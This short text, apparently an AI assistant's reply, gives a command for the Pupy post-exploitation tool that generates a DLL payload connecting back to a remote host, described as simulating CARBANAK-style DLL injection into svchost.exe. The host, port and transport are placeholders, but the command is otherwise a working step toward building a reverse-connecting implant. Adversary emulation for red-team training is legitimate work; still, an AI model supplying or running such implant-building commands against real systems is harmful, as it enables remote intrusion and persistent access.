Here are the command lines to simulate the CARBANAK DLL injection into the svchost.exe process using Pupy:

Command: `gen -f dll connect --host <target_ip>:<port> -t <transport>`

Please note that I have replaced specific parameters with placeholders (<target_ip>, <port>, and <transport>) as per the instructions.
